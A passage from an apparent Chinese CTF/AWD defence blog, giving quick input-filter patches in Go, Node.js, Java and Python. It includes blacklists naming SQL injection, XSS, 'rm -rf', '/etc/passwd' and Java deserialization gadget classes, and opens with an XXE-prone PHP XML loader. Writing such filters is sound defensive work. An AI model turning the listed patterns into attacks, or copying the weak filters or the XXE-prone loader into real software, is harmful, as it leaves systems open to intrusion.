class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$user_info_xml</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user_info_dir</span>.<span class="variable">$username</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;.xml&#x27;</span>);</span><br><span class="line">        <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$user_info_xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h3><p>这个写在漏洞点前面，然后input替换成我们需要检测正则的字符串即可。检测到就会return结束。但是下面的正则写法依赖strings库</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> input <span class="type">string</span></span><br><span class="line"></span><br><span class="line">    fmt.Print(<span class="string">&quot;请输入一个字符串：&quot;</span>)</span><br><span class="line">    fmt.Scanln(&amp;input)</span><br><span class="line"></span><br><span class="line">    maliciousStrings := []<span class="type">string</span>&#123;<span class="string">&quot;union&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;.&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;flag&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    input = strings.ToLower(input) <span class="comment">// 将输入转换为小写，便于匹配</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, s := <span class="keyword">range</span> maliciousStrings &#123;</span><br><span class="line">        <span class="keyword">if</span> strings.Contains(input, s) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="comment">// 包含恶意字符串</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>下面这个写法不依赖这个库。但是代码会多点。都是自己实现的功能</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> input <span class="type">string</span></span><br><span class="line"></span><br><span class="line">    fmt.Print(<span class="string">&quot;请输入一个字符串：&quot;</span>)</span><br><span class="line">    fmt.Scanln(&amp;input)</span><br><span class="line"></span><br><span class="line">    maliciousStrings := []<span class="type">string</span>&#123;<span class="string">&quot;union&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;.&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;flag&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isMalicious(input, maliciousStrings) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isMalicious</span><span class="params">(input <span class="type">string</span>, maliciousStrings []<span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    input = stringToLower(input)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, s := <span class="keyword">range</span> maliciousStrings &#123;</span><br><span class="line">        <span class="keyword">if</span> stringContains(input, s) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringToLower</span><span class="params">(str <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    runes := []<span class="type">rune</span>(str)</span><br><span class="line">    <span class="keyword">for</span> i, r := <span class="keyword">range</span> runes &#123;</span><br><span class="line">        <span class="keyword">if</span> r &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; r &lt;= <span class="string">&#x27;Z&#x27;</span> &#123;</span><br><span class="line">            runes[i] = r + (<span class="string">&#x27;a&#x27;</span> - <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(runes)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringContains</span><span class="params">(str <span class="type">string</span>, substr <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    strRunes := []<span class="type">rune</span>(str)</span><br><span class="line">    substrRunes := []<span class="type">rune</span>(substr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="built_in">len</span>(strRunes)-<span class="built_in">len</span>(substrRunes); i++ &#123;</span><br><span class="line">        found := <span class="literal">true</span></span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="built_in">len</span>(substrRunes); j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> strRunes[i+j] != substrRunes[j] &#123;</span><br><span class="line">                found = <span class="literal">false</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> found &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h3><p>把下面的<code>input</code>改成题目的可控输入点即可</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> input = <span class="string">&quot;awdwawdd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> maliciousStrings = [<span class="string">&quot;__proto__&quot;</span>, <span class="string">&quot;constructor&quot;</span>, <span class="string">&quot;prototype&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;union&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;.&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isMalicious</span>(<span class="params">input, maliciousStrings</span>) &#123;</span><br><span class="line">    input = input.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maliciousStrings.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> pattern = <span class="keyword">new</span> <span class="title class_">RegExp</span>(maliciousStrings[i], <span class="string">&quot;i&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pattern.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">isMalicious</span>(input, maliciousStrings)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;输入参数包含恶意字符串&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;输入参数安全&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// fix后</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/profile&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> blacklist = [</span><br><span class="line">        <span class="string">&quot;outputFunctionName&quot;</span>, <span class="string">&quot;__proto__&quot;</span>, <span class="string">&quot;return&quot;</span>, <span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;mainModule&quot;</span>, <span class="string">&quot;constructor&quot;</span>, <span class="string">&quot;child&quot;</span>, <span class="string">&quot;execSync&quot;</span>,<span class="string">&quot;escapeFunction&quot;</span>, <span class="string">&quot;client&quot;</span>, <span class="string">&quot;compileDebug&quot;</span>, <span class="string">&quot;prototype&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blacklist.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="title function_">includes</span>(blacklist[i]))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">code</span>: <span class="number">400</span>, <span class="attr">msg</span>: <span class="string">&#x27;hack&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MaliciousInputChecker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE id = 1 OR 1=1&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        String[] maliciousStrings = &#123;</span><br><span class="line">    <span class="comment">// SQL注入相关（常见注入片段、关键字）</span></span><br><span class="line">    <span class="string">&quot;\\bor\\s+1\\s*=\\s*1\\b&quot;</span>,  <span class="comment">// 匹配 &quot;OR 1=1&quot; 及其变体（如 OR 1 = 1）</span></span><br><span class="line">    <span class="string">&quot;\\bselect\\b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\\bdrop\\s+table\\b&quot;</span>,      <span class="comment">// 匹配 &quot;DROP TABLE&quot;（删除表操作）</span></span><br><span class="line">    <span class="string">&quot;\\bdelete\\s+from\\b&quot;</span>,     <span class="comment">// 匹配 &quot;DELETE FROM&quot;（删除数据操作）</span></span><br><span class="line">    <span class="string">&quot;\\bexec\\s+\\(&quot;</span>,           <span class="comment">// 匹配 &quot;EXEC (&quot;（执行存储过程）</span></span><br><span class="line">    <span class="string">&quot;\\bxp_cmdshell\\b&quot;</span>,        <span class="comment">// 匹配SQL Server的命令执行函数</span></span><br><span class="line">    <span class="string">&quot;\\binformation_schema\\b&quot;</span>, <span class="comment">// 匹配数据库元信息查询（如获取表结构）</span></span><br><span class="line">    <span class="string">&quot;\\bconcat\\(\\s*user\\(\\)\\s*\\)&quot;</span>, <span class="comment">// 匹配获取数据库用户的函数调用</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// XSS攻击相关（跨站脚本注入）</span></span><br><span class="line">    <span class="string">&quot;&lt;script\\s*&gt;&quot;</span>,             <span class="comment">// 匹配 &quot;&lt;script&gt;&quot; 标签（基础XSS脚本块）</span></span><br><span class="line">    <span class="string">&quot;onclick\\s*=\\s*\&quot;&quot;</span>,       <span class="comment">// 匹配 &quot;onclick=&quot;（事件处理器注入）</span></span><br><span class="line">    <span class="string">&quot;onerror\\s*=\\s*\&quot;&quot;</span>,       <span class="comment">// 匹配 &quot;onerror=&quot;（错误事件注入）</span></span><br><span class="line">    <span class="string">&quot;javascript:\\s*&quot;</span>,          <span class="comment">// 匹配 &quot;javascript:&quot; 伪协议（脚本执行）</span></span><br><span class="line">    <span class="string">&quot;&lt;img\\s+src\\s*=\\s*\&quot;x\&quot;\\s+onerror&quot;</span>, <span class="comment">// 匹配带 onerror 的图片标签</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 命令注入相关（操作系统命令执行）</span></span><br><span class="line">    <span class="string">&quot;\\|\\|&quot;</span>,                   <span class="comment">// 匹配 &quot;||&quot;（逻辑或，拼接命令）</span></span><br><span class="line">    <span class="string">&quot;&amp;&amp;&quot;</span>,                       <span class="comment">// 匹配 &quot;&amp;&amp;&quot;（逻辑与，拼接命令）</span></span><br><span class="line">    <span class="string">&quot;;\\s*rm\\s+-rf&quot;</span>,           <span class="comment">// 匹配 &quot;; rm -rf&quot;（删除文件命令）</span></span><br><span class="line">    <span class="string">&quot;system\\(\\s*\&quot;&quot;</span>,          <span class="comment">// 匹配 &quot;system(&quot;（执行系统命令函数）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 路径遍历相关（访问未授权文件）</span></span><br><span class="line">    <span class="string">&quot;\\.\\./&quot;</span>,                  <span class="comment">// 匹配 &quot;../&quot;（向上级目录遍历）</span></span><br><span class="line">    <span class="string">&quot;\\.\\.\\\\&quot;</span>,               <span class="comment">// 匹配 &quot;..\&quot;（Windows系统路径遍历）</span></span><br><span class="line">    <span class="string">&quot;/etc/passwd&quot;</span>               <span class="comment">// 匹配Linux敏感文件路径</span></span><br><span class="line">&#125;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isMalicious</span><span class="params">(String input, String[] maliciousStrings)</span> &#123;</span><br><span class="line">        <span class="comment">//// 1. 将输入转换为小写，统一大小写格式（辅助后续不区分大小写的匹配）</span></span><br><span class="line">        input = input.toLowerCase();</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 2. 遍历所有恶意字符串，检查输入中是否包含任意一个</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; maliciousStrings.length; i++) &#123;</span><br><span class="line">            <span class="comment">// 编译恶意字符串为正则模式，指定Pattern.CASE_INSENSITIVE（不区分大小写匹配）</span></span><br><span class="line">            <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(maliciousStrings[i], Pattern.CASE_INSENSITIVE);</span><br><span class="line">            <span class="comment">// 检查输入中是否存在该恶意模式（find()表示只要包含子串即可匹配）</span></span><br><span class="line">            <span class="keyword">if</span> (pattern.matcher(input).find()) &#123;</span><br><span class="line">                <span class="comment">// 只要找到一个恶意模式，就返回true（表示输入是恶意的）</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>反序列化，WAF掉恶意类</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NewObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;String&gt; BLACKLISTED_CLASSES = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        BLACKLISTED_CLASSES.add(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        BLACKLISTED_CLASSES.add(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        BLACKLISTED_CLASSES.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        BLACKLISTED_CLASSES.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line"><span class="comment">//        BLACKLISTED_CLASSES.add(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);</span></span><br><span class="line"><span class="comment">//        BLACKLISTED_CLASSES.add(&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;);</span></span><br><span class="line"><span class="comment">//        BLACKLISTED_CLASSES.add(&quot;org.apache.commons.collections.map.LazyMap&quot;);</span></span><br><span class="line"><span class="comment">//        BLACKLISTED_CLASSES.add(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;);</span></span><br><span class="line"><span class="comment">//        BLACKLISTED_CLASSES.add(&quot;org.apache.commons.collections4.map.LazyMap&quot;);</span></span><br><span class="line"><span class="comment">//        BLACKLISTED_CLASSES.add(&quot;javax.management.BadAttributeValueExpException&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NewObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (BLACKLISTED_CLASSES.contains(desc.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在<strong>出网</strong>环境下遇到java，直接在<code>pom.xml</code>里面升级版本，全部往上调</p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>原型链污染，最好删除<code>merge(src, dst)函数</code></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">input_str =<span class="string">&quot;awdawafaunonwdwa&quot;</span></span><br><span class="line"></span><br><span class="line">malicious_strings = [<span class="string">&quot;__proto__&quot;</span>, <span class="string">&quot;constructor&quot;</span>, <span class="string">&quot;prototype&quot;</span>, <span class="string">&quot;insert&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;union&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;.&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;flag&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> malicious_strings:</span><br><span class="line">    <span class="keyword">if</span> input_str.lower().find(s) != -<span class="number">1</span>:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure></div>
+
+<p>SSTI，最好将<code>render_template_string()</code>改为<code>render_template()</code></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">black_list = [<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> tmp <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> tmp <span class="keyword">in</span> v:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;note cannot contain a special character&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>pickle反序列化，禁用pickle，改用json；如果<code>pickle.loads</code>不影响程序功能，直接删除即可</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.loads(data)改为json.load(data)</span><br></pre></td></tr></table></figure></div>
+
+<p>RCE，最好删除或注释相应代码</p>
